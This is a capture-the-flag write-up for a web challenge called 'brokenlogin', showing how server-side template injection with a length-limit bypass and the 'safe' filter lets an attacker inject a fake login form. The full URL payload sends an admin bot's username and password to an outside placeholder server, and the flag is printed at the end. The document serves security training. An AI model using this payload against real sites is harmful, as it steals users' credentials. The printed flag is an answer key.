#### Challenge:

Talk about a garbage website... I don't think anybody's been able to [log in](https://brokenlogin.web.actf.co/) yet! If you find something, make sure to let the [admin](https://admin-bot.actf.co/brokenlogin) know.

[Source code](./app.py ":ignore") [Admin bot code](./brokenlogin.js ":ignore")


---

#### Solution:

- in this challenge we need to stage the `html` page for the admin so that he submit's the secret to our server, this can be done just via creating our own `form` before the one that is provided and pointing it to our server...
- inspecting the `app.py` suggest that we can exploit template injection via `{{}}` however we are limited just to `25` characters
- to get rid of the length limitation we can use the `message` parameter just as proxy to other query parameter like so `https://brokenlogin.web.actf.co/?message={{request.args.p}}&p=<h1>1</h1>`
- last thing is that the string is not rendered as `html` but plain string, so to get rid of it we will use the `safe` so that the content is ignored by `escape()`

- putting it all together we just need to provide the following `url` to admin bot and checks the logs of our server...
```
https://brokenlogin.web.actf.co/?message={{request.args.p|safe}}&p=%3Cform%20action=%22https://my-server/%22%20method=%22GET%22%3E%3Cinput%20id=%22username%22%20type=%22text%22%20name=%22username%22%20/%3E%3Cinput%20id=%22password%22%20type=%22password%22%20name=%22password%22%20/%3E%3Cinput%20type=%22submit%22/%3E%3C/form%3E%3C/p%3E%3C/body%3E%3C/html%3E
```

---

<details><summary>FLAG:</summary>

```
actf{adm1n_st1ll_c4nt_l0g1n_11dbb6af58965de9}
```

</details>
<br/>
